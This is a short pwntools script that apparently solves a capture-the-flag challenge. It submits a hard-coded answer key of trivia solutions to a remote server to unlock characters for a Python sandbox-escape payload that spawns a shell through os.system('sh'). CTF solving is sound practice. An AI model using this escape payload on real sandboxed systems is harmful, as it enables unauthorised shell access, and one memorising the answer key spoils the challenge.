from pwn import *

host = '34.148.103.218'
port = 1229
io = remote(host, port)

io.recv()
io.sendline(b'ready')

need_chars = list(set(
    "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('sh')"
))
print(f'Needed chars: {need_chars}')

solutions = [
    (b'sound familiar 100', b'deepfake'),
    (b'sound familiar 200', b'4'),
    (b'sound familiar 300', b'dvorak'),
    (b'cybersecurity now 100', b'Log4j'),
    (b'cybersecurity now 200', b'PrintNightmare'),
    (b'cybersecurity now 300', b'CVE-2022-1096'),
    (b'cybersecurity now 400', b'starlink'),
    (b'cybersecurity now 500', b'world backup day'),
    (b'cybersecurity history 100', b'caesar'),
    (b'cybersecurity history 300', b'reaper'),
    (b'cybersecurity history 500', b'Susy Thunder'),
    (b'computer programming 100', b'moth'),
    (b'computer programming 300', b'0'),
    (b'computer programming 400', b'infinity'),
    (b'miscellaneous 100', b'blue'),
    (b'miscellaneous 200', b'Akamai'),
    (b'miscellaneous 400', b'2020'),
]

unlocked_chars = []

for problem, solution in solutions:
    io.recv()
    io.sendline(problem)
    io.recvuntil(b'answer:\n')
    io.sendline(solution)

    result = io.recvline().strip()
    print(result)
    if result.startswith(b'Correct'):
        c_s = result[57:].split()
        unlocked_chars.extend([chr(_c[1]) for _c in c_s])

        for c in unlocked_chars:
            if c in need_chars:
                need_chars.remove(c)
        print(need_chars)
    else:
        print(problem, solution)

print(unlocked_chars)

# Run jailbreak script below!

io.interactive()
